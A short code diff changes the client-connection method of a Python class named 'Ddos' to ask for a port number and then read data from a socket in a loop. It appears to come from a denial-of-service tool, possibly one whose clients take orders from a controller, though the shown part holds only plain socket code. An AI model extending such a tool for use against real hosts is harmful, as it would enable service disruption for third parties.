@@ -35,8 +35,10 @@ class Ddos:
     def OnClientJoin(self, client: socket.socket):
         pass
 
-    def ClientMode(self, ip: str, port: int):
-        self.sock.connect((ip, port))
+    def ClientMode(self):
+        PortNumber = int(input("\n\n   [*]Port number to connect: "))
+
+        self.sock.connect((self.ip, PortNumber))
 
         while True:
             buffer = self.sock.recv(4096)
